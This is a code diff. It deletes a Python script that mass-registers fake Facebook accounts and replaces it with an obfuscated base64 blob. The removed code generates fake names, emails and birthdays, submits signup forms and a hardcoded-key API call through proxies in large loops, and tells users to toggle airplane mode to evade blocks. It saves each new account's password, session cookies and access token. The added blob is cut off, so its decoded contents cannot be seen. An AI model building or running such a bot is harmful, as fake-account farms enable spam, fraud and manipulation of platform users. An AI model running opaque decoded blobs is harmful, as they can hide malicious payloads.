-    print(" \033[1;32m[\033[1;31m2\033[1;32m] NAME INDONESIA")
-    print(" \033[1;32m[\033[1;31m3\033[1;32m] NAME VIETNAMESE")
-    linex()
-    ethan_username = input(" \033[1;32m[\033[1;31m–\033[1;32m] CHOOSE : ")
-    linex()
-    print(" \033[1;32m[\033[1;31m1\033[1;32m] AUTO PASSWORD")
-    print(" \033[1;32m[\033[1;31m2\033[1;32m] MANUAL PASSWORD")
-    linex()
-    ethan_password = input(" \033[1;32m[\033[1;31m–\033[1;32m] CHOOSE : ")
-    linex()
-    if ethan_password in ["2", "02"]:
-        pasw2 = input(" \033[1;32m[\033[1;31m–\033[1;32m] ENTER CUSTOM PASSWORD : ")
-        linex()
-    clear()
-    print(" \033[1;32m[\033[1;31m–\033[1;32m] TOTAL UID  \033[1;33m: \033[1;37m50000")
-    print(
-        " \033[1;32m[\033[1;31m–\033[1;32m] IF NO RESULT \033[1;33m[\033[1;31mON\033[1;33m/\033[1;31mOFF\033[1;33m] \033[1;32mAIRPLAN MODE"
-    )
-    linex()
-    for make in range(50000):
-        global oks, cps
-        boos = random.choice([P, M, H, K, B, U, O, N])
-        sys.stdout.write(
-            f"\r\r\033[1;37m<[{boos}LEO-TRICKER\033[1;37m]<🖤>[{make + 1}|\033[1;32m{oks}\033[1;37m]> "
-        )
-        sys.stdout.flush()
-        # sys.stdout.write(f"\r\r\033[1;37m[CHAND-CREATE] {make+1}\033[1;37m|\033[1;32mOK-:{len(oks)}\033[1;37m");sys.stdout.flush()
-        ses = requests.Session()
-        response = ses.get(
-            url="https://x.facebook.com/reg",
-            params={
-                "_rdc": "1",
-                "_rdr": "",
-                "wtsid": "rdr_0t3qOXoIHbMS6isLw",
-                "refsrc": "deprecated",
-            },
-        )
-        mts = ses.get("https://x.facebook.com").text
-        m_ts = re.search(r'name="m_ts" value="(.*?)"', str(mts)).group(1)
-        formula = extractor(response.text)
-        if ethan_username in ["1", "01"]:
-            firstname, lastname = fake_philippines()
-        if ethan_username in ["2", "02"]:
-            firstname, lastname = fake_indonesia()
-        if ethan_username in ["3", "03"]:
-            firstname, lastname = fake_vietnamese()
-        domain = random.choice(
-            [
-                "gmail.com",
-                "hotmail.com",
-                "outlook.com",
-                "yahoo.com",
-                "myyahoo.com",
-                "protonmail.com",
-                "live.com",
-                "rocket.com",
-            ]
-        )
-        email2 = (
-            f"{firstname.lower()}{lastname.lower()}{random.randint(10, 99)}@{domain}"
-        )
-        if ethan_password in ["1", "01"]:
-            pasw2 = f"{firstname.lower()}{lastname.lower()}"
-        # print(f"\r \033[1;32m[\033[1;31m–\033[1;32m] NAME   : {firstname} {lastname}")
-        # print(f"\r \033[1;32m[\033[1;31m–\033[1;32m] EMAIL  : {email2}")
-        cookies = None
-        payload1 = None
-        payload2 = {}
-        payload3 = {}
-        payload3 = {
-            "ccp": "2",
-            "reg_instance": str(formula["reg_instance"]),
-            "submission_request": "true",
-            "helper": "",
-            "reg_impression_id": str(formula["reg_impression_id"]),
-            "ns": "1",
-            "zero_header_af_client": "",
-            "app_id": "103",
-            "logger_id": str(formula["logger_id"]),
-            "field_names[0]": "firstname",
-            "firstname": firstname,
-            "lastname": lastname,
-            "field_names[1]": "birthday_wrapper",
-            "birthday_day": str(random.randint(1, 28)),
-            "birthday_month": str(random.randint(1, 12)),
-            "birthday_year": str(random.randint(1992, 2009)),
-            "age_step_input": "",
-            "did_use_age": "false",
-            "field_names[2]": "reg_email__",
-            "reg_email__": email2,
-            "field_names[3]": "sex",
-            "sex": "2",
-            "preferred_pronoun": "",
-            "custom_gender": "",
-            "field_names[4]": "reg_passwd__",
-            "name_suggest_elig": "false",
-            "was_shown_name_suggestions": "false",
-            "did_use_suggested_name": "false",
-            "use_custom_gender": "false",
-            "guid": "",
-            "pre_form_step": "",
-            "encpass": "#PWD_BROWSER:0:{}:{}".format(
-                str(time.time()).split(".")[0], pasw2
-            ),
-            "submit": "Sign Up",
-            "fb_dtsg": "NAcMC2x5X2VrJ7jhipS0eIpYv1zLRrDsb5y2wzau2bw3ipw88fbS_9A:0:0",
-            "jazoest": str(formula["jazoest"]),
-            "lsd": str(formula["lsd"]),
-            "__dyn": "1ZaaAG1mxu1oz-l0BBBzEnxG6U4a2i5U4e0C8dEc8uwcC4o2fwcW4o3Bw4Ewk9E4W0pKq0FE6S0x81vohw5Owk8aE36wqEd8dE2YwbK0iC1qw8W0k-0jG3qaw4kwbS1Lw9C0le0ue0QU",
-            "__csr": "",
-            "__req": "p",
-            "__fmt": "1",
-            "__a": "AYkiA9jnQluJEy73F8jWiQ3NTzmH7L6RFbnJ_SMT_duZcpo2yLDpuVXfU2doLhZ-H1lSX6ucxsegViw9lLO6uRx31-SpnBlUEDawD_8U7AY4kQ",
-            "__user": "0",
-        }
-        header1 = {
-            "Host": "m.facebook.com",
-            "Connection": "keep-alive",
-            "Upgrade-Insecure-Requests": "1",
-            "User-Agent": W_ueragent(),
-            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-            "dnt": "1",
-            "X-Requested-With": "mark.via.gp",
-            "Sec-Fetch-Site": "none",
-            "Sec-Fetch-Mode": "navigate",
-            "Sec-Fetch-User": "?1",
-            "Sec-Fetch-Dest": "document",
-            "dpr": "1.75",
-            "viewport-width": "980",
-            "sec-ch-ua": '"Android WebView";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
-            "sec-ch-ua-mobile": "?1",
-            "sec-ch-ua-platform": '"Android"',
-            "sec-ch-ua-platform-version": '""',
-            "sec-ch-ua-model": '""',
-            "sec-ch-ua-full-version-list": "",
-            "sec-ch-prefers-color-scheme": "dark",
-            "Accept-Encoding": "gzip, deflate, br, zstd",
-            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
-        }
-        reg_url = "https://www.facebook.com/reg/submit/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzM0NDE0OTk2LCJjYWxsc2l0ZV9pZCI6OTA3OTI0NDAyOTQ4MDU4fQ%3D%3D&multi_step_form=1&skip_suma=0&shouldForceMTouch=1"
-        while True:
-            try:
-                py_submit = ses.post(reg_url, data=payload3, headers=header1, proxies=proxies)
-                break
-            except:
-                wait_conn()
-        if "c_user" in py_submit.cookies:
-            # first_cok = ses.cookies.get_dict()
-            # uid = str(first_cok["c_user"])
-            # cookie = (";").join([ "%s=%s" % (key,value) for key,value in ses.cookies.get_dict().items()])
-            cok = ";".join([k + "=" + v for k, v in ses.cookies.get_dict().items()])
-            uid = re.findall("c_user=(.*?);", cok)[0]
-            coki = (
-                cvt("oks", ses.cookies.get_dict())
-                + "dpr=2;locale=en_US;wd=950x1835;m_page_voice="
-                + uid
-            )
-            print("\r\033[1;32m<[LEO-OK]> " + uid + " | " + pasw2 + "\033[1;37m")
-            # print("\033[1;33m<[BISCUT-🍪]> :\033[1;33m "+coki)
-            # print(f"\r \033[1;32m[\033[1;31m–\033[1;32m] UID    : {uid}")
-            # print(f"\r \033[1;32m[\033[1;31m–\033[1;32m] PASS   : {pasw2}")
-            # print(f"\r \033[1;32m[\033[1;31m–\033[1;32m] COOKIE : {coki}")
-            # linex()
-            file_path_ok = os.path.join(folder_path, "LEO-CREATE-OK.txt")
-            file_path_cookies = os.path.join(folder_path, "LEO-CREATE-COOKIE.txt")
-            with (
-                open(file_path_ok, "a") as file_ok,
-                open(file_path_cookies, "a") as file_cookies,
-            ):
-                file_ok.write(uid + " | " + pasw2 + "\n")
-                file_cookies.write(uid + " | " + pasw2 + " |-----> " + coki + "\n")
-            oks += 1
-        else:
-            # print(f" \033[1;32m[\033[1;31m–\033[1;32m] \033[1;31mSUCCESSFULLY CHECKPOINT ID")
-            # linex()
-            cps += 1
-
-
-# ------------------[ METHOD 2 ]-------------------#
-def auto_create_fb_method_2_() -> None:
-    clear()
-    print(" \033[1;32m[\033[1;31m1\033[1;32m] NAME PHILIPPINE")
-    print(" \033[1;32m[\033[1;31m2\033[1;32m] NAME INDONESIA")
-    print(" \033[1;32m[\033[1;31m3\033[1;32m] NAME VIETNAMESE")
-    linex()
-    ethan_username = input(" \033[1;32m[\033[1;31m–\033[1;32m] CHOOSE : ")
-    linex()
-    print(" \033[1;32m[\033[1;31m1\033[1;32m] AUTO PASSWORD")
-    print(" \033[1;32m[\033[1;31m2\033[1;32m] MANUAL PASSWORD")
-    linex()
-    ethan_password = input(" \033[1;32m[\033[1;31m–\033[1;32m] CHOOSE : ")
-    linex()
-    if ethan_password in ["2", "02"]:
-        pasw2 = input(" \033[1;32m[\033[1;31m–\033[1;32m] ENTER CUSTOM PASSWORD : ")
-        linex()
-    for make in range(1000):
-        sys.stdout.write(
-            f"\r\r\033[1;37m<[{boos}MR-LEO\033[1;37m]<🖤>[{make + 1}|\033[1;32m{len(ok)}\033[1;37m]> "
-        )
-        sys.stdout.flush()
-        ses = requests.Session()
-        fake = Faker()
-        api_key = "882a8490361da98702bf97a021ddc14d"
-        secret = "62f8ce9f74b12f84c123cc23437a4a32"
-        gender = random.choice(["M", "F"])
-        if ethan_username in ["1", "01"]:
-            firstname, lastname = fake_philippines()
-        if ethan_username in ["2", "02"]:
-            firstname, lastname = fake_indonesia()
-        if ethan_username in ["3", "03"]:
-            firstname, lastname = fake_vietnamese()
-        domain = random.choice(
-            [
-                "gmail.com",
-                "hotmail.com",
-                "outlook.com",
-                "yahoo.com",
-                "myyahoo.com",
-                "protonmail.com",
-                "live.com",
-                "rocket.com",
-            ]
-        )
-        email2 = (
-            f"{firstname.lower()}{lastname.lower()}{random.randint(10, 99)}@{domain}"
-        )
-        if ethan_password in ["1", "01"]:
-            pasw2 = f"{firstname.lower()}{lastname.lower()}"
-        time.sleep(5)
-        print(f"\r \033[1;32m[\033[1;31m–\033[1;32m] NAME   : {firstname} {lastname}")
-        print(f"\r \033[1;32m[\033[1;31m–\033[1;32m] EMAIL  : {email2}")
-        birthday = fake.date_of_birth(minimum_age=18, maximum_age=90)
-        req = {
-            "api_key": api_key,
-            "attempt_login": True,
-            "birthday": birthday.strftime("%Y-%m-%d"),
-            "client_country_code": "US",
-            "fb_api_caller_class": "com.facebook.registration.protocol.RegisterAccountMethod",
-            "fb_api_req_friendly_name": "registerAccount",
-            "firstname": firstname,
-            "format": "json",
-            "gender": gender,
-            "lastname": lastname,
-            "email": email2,
-            "locale": "en_US",
-            "method": "user.register",
-            "password": pasw2,
-            "reg_instance": generate_random_string(32),
-            "return_multiple_errors": True,
-        }
-        headers = {"User-Agent": user_agent()}
-        sorted_req = sorted(req.items(), key=lambda x: x[0])
-        sig = "".join(f"{k}={v}" for k, v in sorted_req)
-        ensig = hashlib.md5((sig + secret).encode()).hexdigest()
-        req["sig"] = ensig
-        api_url = "https://b-api.facebook.com/method/user.register"
-        while True:
-            try:
-                response = ses.post(api_url, data=req, headers=headers, proxies=proxies)
-                break
-            except:
-                wait_conn()
-        reg = response.json()
-        uid = reg.get("new_user_id")
-        token = reg.get("session_info", {}).get("access_token")
-        if uid:
-            status = lock_checker(uid)
-            if status == "Locked":
-                print(
-                    f" \033[1;32m[\033[1;31m–\033[1;32m] \033[1;31mSUCCESSFULLY CHECKPOINT ID"
-                )
-            else:
-                print(f"\r \033[1;32m[\033[1;31m–\033[1;32m] UID    : {uid}")
-                print(f"\r \033[1;32m[\033[1;31m–\033[1;32m] PASS   : {pasw2}")
-                print(f"\r \033[1;32m[\033[1;31m–\033[1;32m] TOKEN  : {token}")
-                linex()
-                ok.append(uid)
-        else:
-            print(
-                f" \033[1;32m[\033[1;31m–\033[1;32m] \033[1;31mSUCCESSFULLY CHECKPOINT ID"
-            )
-            linex()
-
-
-# ------------------[ METHOD 3 SPREAD UID ]-------------------#
-SPREAD_FOLDER = "SPREAD-UID-LEO"
-
-
-def auto_create_fb_method_3_():
-    clear()
-    linex()
-    print(" \033[1;32m[\033[1;31m–\033[1;32m] SPREAD UID")
-    linex()
-    path = input(" \033[1;32m[\033[1;31m–\033[1;32m] ENTER TXT FILE PATH : ").strip()
-    if not path:
-        print(" \033[1;32m[\033[1;31m–\033[1;32m] \033[1;31mNO FILE SELECTED")
-        time.sleep(2)
-        menu()
-        return
-    try:
-        with open(path, "r") as f:
-            lines = [line.strip() for line in f if line.strip()]
-    except:
-        print(f" \033[1;32m[\033[1;31m–\033[1;32m] \033[1;31mFILE NOT FOUND: {path}")
-        time.sleep(2)
-        menu()
-        return
-    os.makedirs(SPREAD_FOLDER, exist_ok=True)
-    out_path = os.path.join(SPREAD_FOLDER, "SPREAD-UID.txt")
-    total = len(lines)
-    count = 0
-    print(f" \033[1;32m[\033[1;31m–\033[1;32m] TOTAL LINES: \033[1;37m{total}")
-    linex()
-    with open(out_path, "w") as out:
-        for line in lines:
-            uid = line.split("|")[0].split(",")[0].split()[0].strip()
-            if uid and uid.isdigit():
-                out.write(uid + "\n")
-                count += 1
-                sys.stdout.write(f"\r\033[1;32m[SPREAD] {uid}                    \n")
-                sys.stdout.flush()
-    linex()
-    print(f" \033[1;32m[\033[1;31m–\033[1;32m] ✅ SPREAD: \033[1;37m{count}")
-    print(f" \033[1;32m[\033[1;31m–\033[1;32m] \033[1;37mSAVED TO: {SPREAD_FOLDER}/SPREAD-UID.txt")
-    input("\n \033[1;33mPress ENTER to go back...")
-    menu()
-
-
-# ------------------[  END  ]-------------------#
-if __name__ == "__main__":
-    while True:
-        try:
-            if approval():
-                menu()
-            else:
-                exit("\033[1;31m━▷ Access Denied! Get approval first.")
-        except:
-            wait_conn()
+import base64,zlib
+x = bytearray(base64.b64decode(
+"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"
